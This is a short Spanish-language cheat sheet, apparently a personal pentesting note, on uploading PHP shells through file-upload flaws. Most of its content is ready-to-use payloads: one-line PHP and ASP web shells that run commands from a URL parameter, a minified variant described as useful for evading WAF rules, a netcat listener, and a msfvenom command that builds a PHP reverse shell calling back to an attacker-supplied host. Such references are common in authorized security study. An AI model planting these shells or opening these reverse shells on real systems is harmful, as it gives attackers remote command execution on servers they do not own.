---
aliases: null
tags:
  - type/technique
  - vuln/file-upload
  - technique/execution
  - asset/web-app
kind: SubCheatSheet
linked:
  - '[[File Upload - Vulnerabilidades]]'
---
# File Upload - Shells en PHP

***

## Cheatsheet

|   **Categoría**   |       **Enfoque**       |                                  **Herramienta / Payload**                                   |                                   **Ejecución**                                   | **Notas y Limitaciones**                                                                                                |
|:-----------------:|:-----------------------:|:--------------------------------------------------------------------------------------------:|:---------------------------------------------------------------------------------:| ----------------------------------------------------------------------------------------------------------------------- |
|   **Web Shell**   | Pública / Preexistente  |             `phpbash`<br><pre><code>/opt/useful/seclists/Web-Shells</code></pre>             |                Visitar la URL del archivo subido el el navegador.                 | Proporciona una interfaz visual similar a una terminal. Ideal para una enumeración inicial rápida.                      |
|   **Web Shell**   |  Custom (PHP Estándar)  |                 <pre><code><\?php system($_REQUEST['cmd']); ?></code></pre>                  |                   Visitar URL + parámetro GET:<br>`?cmd=whoami`                   | Permite la validación rápida de vulnerabilidades [[RCE]]. Falla si `system()` está bloqueado.                           |
|   **Web Shell**   | Custom (PHP Minificada) |                           <pre><code><\?=`$_GET[0]`?></code></pre>                           |                    Visitar URL + parámetro GET:<br>`?0=whoami`                    | Utiliza _short open tags_ y _backticks_. Extremadamente útil para evadir restricciones de longitud o reglas de [[WAF]]. |
|   **Web Shell**   |      Custom (.NET)      |                      <pre><code><% eval request('cmd') %></code></pre>                       |                   Visitar URL + parámetro GET:<br>`?cmd=whoami`                   | Adaptación del concepto para servidores Windows/IIS (archivos `.asp` o `.aspx`).                                        |
| **Reverse Shell** | Pública / Preexistente  |         `pentestmonkey` (PHP)<br><pre><code>https://www.revshells.com/</code></pre>          |  -Atacante: `nc -lvnp <PUERTO>`<br>-Víctima: Navegar a la URL del _script_.<br>   | Fuerza al servidor a iniciar una conexión saliente hacia la infraestructura.                                            |
| **Reverse Shell** |    Custom (MSFvenom)    | <pre><code>msfvenom -p php/reverse_php LHOST=<IP> LPORT=<PORT> -f raw > rev.php</code></pre> | -Escucha: `nc -lvnp <PORT>` o `exploit/multi/handler`<br>-Visitar URL del script. | Util para crear artefactos ofuscados o para la integración directa con [[Metasploit Framework]].                                  |


***
